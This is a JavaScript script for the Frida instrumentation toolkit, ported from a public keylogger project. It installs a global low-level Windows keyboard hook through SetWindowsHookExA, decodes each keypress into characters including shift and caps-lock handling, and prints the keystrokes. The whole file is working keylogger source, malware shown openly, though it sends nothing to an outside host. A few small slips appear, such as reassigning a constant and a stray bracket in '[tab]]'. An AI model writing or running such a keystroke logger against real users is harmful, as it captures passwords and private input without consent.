// Loosely ported from: https://github.com/killswitch-GUI/SetWindowsHookEx-Keylogger
// Original License remains unchanged.

// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-setwindowshookexa
// HHOOK SetWindowsHookExA(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);
const SetWindowsHookExAPtr = Module.getExportByName('user32.dll', 'SetWindowsHookExA');

// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-callnexthookex
// LRESULT CallNextHookEx(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);
const CallNextHookExPtr = Module.getExportByName('user32.dll', 'CallNextHookEx');

// https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getmodulehandlea
// HMODULE GetModuleHandleA(LPCSTR lpModuleName);
const GetModuleHandleAPtr = Module.getExportByName('kernel32.dll', 'GetModuleHandleA');

// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getkeystate
// SHORT GetKeyState(int nVirtKey);
const getKeyStatePtr = Module.getExportByName('user32.dll', 'GetKeyState');

// https://github.com/frida/frida/issues/541#issuecomment-402559516
// BOOL GetMessageA(LPMSG lpMsg, HWND  hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
const GetMessagePtr = DebugSymbol.fromName('GetMessageA').address;  // user32.dll

console.log('Pointer resolutions =>\n'
  + ' SetWindowsHookExPtr @ ' + SetWindowsHookExAPtr + '\n'
  + ' CallNextHookEx      @ ' + CallNextHookExPtr + '\n'
  + ' CallNextHookEx      @ ' + CallNextHookExPtr + '\n'
  + ' GetMessage          @ ' + GetMessagePtr);

// 'Handles' on enumerated export pointers
const SetWindowsHookExA = new NativeFunction(SetWindowsHookExAPtr, 'pointer', ['int', 'pointer', 'pointer', 'int']);
const CallNextHookEx = new NativeFunction(CallNextHookExPtr, 'pointer', ['pointer', 'int', 'pointer', 'pointer']);
const GetModuleHandleA = new NativeFunction(GetModuleHandleAPtr, 'pointer', ['pointer']);
const GetMessage = new NativeFunction(GetMessagePtr, 'int', ['pointer', 'pointer', 'int', 'int']);
const GetKeyState = new NativeFunction(getKeyStatePtr, 'int', ['int']);

// https://docs.microsoft.com/en-us/windows/desktop/inputdev/keyboard-input-notifications
const WH_KEYBOARD_LL = 13;
const WM_KEYDOWN = 0x100;
const WM_SYSKEYDOWN = 0x104;
const WM_KEYUP = 0x101;
const HC_ACTION = 0;
const HHOOK = new NativePointer(Process.pointerSize);

// https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes
const VK_CAPITAL = 0x14;
const VK_LSHIFT = 0xA0;
const VK_RSHIFT = 0xA1;

// Shift key handler
const SHIFT = false;

// LowLevelKeyboardProc callback function:
// https://msdn.microsoft.com/en-us/library/ms644985(v=VS.85).aspx
const kbHookPtr = new NativeCallback(function (nCode, wParam, lParam) {

  // lParam ->
  //  https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagkbdllhookstruct
  //
  // typedef struct tagKBDLLHOOKSTRUCT {
  //   DWORD     vkCode;
  //   DWORD     scanCode;
  //   DWORD     flags;
  //   DWORD     time;
  //   ULONG_PTR dwExtraInfo;
  // } KBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

  if (nCode < 0) {
    return CallNextHookEx(HHOOK, nCode, wParam, lParam);
  }

  // read the key byte from (KBDLLHOOKSTRUCT*)lParam
  // lParam->vkCode
  key = lParam.readInt();

  // Check for shift key
  if (key == VK_LSHIFT || key == VK_RSHIFT) {
    if (parseInt(wParam) == WM_KEYDOWN) {
      SHIFT = true;
    } else if (parseInt(wParam) == WM_KEYUP) {
      SHIFT = false;
    } else {
      SHIFT = false;
    }
  }

  // Leave early if we don't have an interesting keypress
  if (!(parseInt(wParam) == WM_KEYDOWN || parseInt(wParam) == WM_SYSKEYDOWN)) {
    return CallNextHookEx(HHOOK, nCode, wParam, lParam);
  }

  var CAPS = false;
  if (GetKeyState(VK_CAPITAL) > 0) {
    CAPS = true;
  }

  parsedKey = parseKey(key, CAPS, SHIFT);
  console.log(parsedKey);

  return CallNextHookEx(HHOOK, nCode, wParam, lParam);

}, 'pointer', ['int', 'pointer', 'pointer']);

// Handle on our Fresh keyboard hook
const kbHook = new NativeFunction(kbHookPtr, 'pointer', ['int', 'pointer', 'pointer']);

// Parses an intkey
const parseKey = function (code, caps, shift) {
  // Source: https://github.com/killswitch-GUI/SetWindowsHookEx-Keylogger/blob/
  //          master/SetWindowsHookEx-Keylogger/SetWindowsHookEx-Keylogger/SetWindowsHookEx-Keylogger.cpp#L31
  var key;

  switch (code) {
    case 0x41: key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a"); break;
    case 0x42: key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b"); break;
    case 0x43: key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c"); break;
    case 0x44: key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d"); break;
    case 0x45: key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e"); break;
    case 0x46: key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f"); break;
    case 0x47: key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g"); break;
    case 0x48: key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h"); break;
    case 0x49: key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i"); break;
    case 0x4A: key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j"); break;
    case 0x4B: key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k"); break;
    case 0x4C: key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l"); break;
    case 0x4D: key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m"); break;
    case 0x4E: key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n"); break;
    case 0x4F: key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o"); break;
    case 0x50: key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p"); break;
    case 0x51: key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"); break;
    case 0x52: key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r"); break;
    case 0x53: key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s"); break;
    case 0x54: key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t"); break;
    case 0x55: key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u"); break;
    case 0x56: key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v"); break;
    case 0x57: key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w"); break;
    case 0x58: key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x"); break;
    case 0x59: key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"); break;
    case 0x5A: key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"); break;

    // https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codesunknown-key
    case 0x60: key = "0"; break;
    case 0x61: key = "1"; break;
    case 0x62: key = "2"; break;
    case 0x63: key = "3"; break;
    case 0x64: key = "4"; break;
    case 0x65: key = "5"; break;
    case 0x66: key = "6"; break;
    case 0x67: key = "7"; break;
    case 0x68: key = "8"; break;
    case 0x69: key = "9"; break;
    case 0x6A: key = "*"; break;
    case 0x6B: key = "+"; break;
    case 0x6C: key = "-"; break;
    case 0x6D: key = "-"; break;
    case 0x6E: key = "."; break;
    case 0x6F: key = "/"; break;

    // Keys
    case 0x90: key = "[num lock]"; break;
    case 0x91: key = "[scroll lock]"; break;
    case 0x08: key = "[backspace]"; break;
    case 0x09: key = "[tab]]"; break;
    case 0x0D: key = "[enter]"; break;
    case 0x10: key = "[shift]"; break;
    case 0x11: key = "[ctrl]"; break;
    case 0x12: key = "[alt]"; break;
    case 0x14: key = "[capslock]"; break;
    case 0x1B: key = "[esc]"; break;
    case 0x20: key = "[space]"; break;
    case 0x21: key = "[page up]"; break;
    case 0x22: key = "[page down]"; break;
    case 0x23: key = "[end]"; break;
    case 0x24: key = "[home]"; break;
    case 0x25: key = "[left]"; break;
    case 0x26: key = "[up]"; break;
    case 0x27: key = "[right]"; break;
    case 0x28: key = "[down]"; break;
    case 0x2D: key = "[insert]"; break;
    case 0x2E: key = "[delete]"; break;

    case 0x30: key = shift ? "!" : "1"; break;
    case 0x31: key = shift ? "@" : "2"; break;
    case 0x32: key = shift ? "#" : "3"; break;
    case 0x33: key = shift ? "$" : "4"; break;
    case 0x34: key = shift ? "%" : "5"; break;
    case 0x35: key = shift ? "^" : "6"; break;
    case 0x36: key = shift ? "&" : "7"; break;
    case 0x37: key = shift ? "*" : "8"; break;
    case 0x38: key = shift ? "(" : "9"; break;
    case 0x39: key = shift ? ")" : "0"; break;

    case 0x5B: key = "[left super]"; break;
    case 0x5C: key = "[right super]"; break;
    case 0xA0: key = "[left shift]"; break;
    case 0xA1: key = "[right shift]"; break;
    case 0xA2: key = "[left control]"; break;
    case 0xA3: key = "[right control]"; break;

    default: key = "[unknown-key (" + code + ")]"; break;
  }

  return key;
}

console.log('Trying to install hook...');
const res = SetWindowsHookExA(WH_KEYBOARD_LL, kbHookPtr, GetModuleHandleA(NULL), 0);
console.log('Hook installation result was: ' + res);

var msg = new NativePointer(Process.pointerSize);

setTimeout(function () {

  while (GetMessage(msg, NULL, 0, 0) > 0) {
    console.log('Get message: ' + msg);
  }

}, 100);
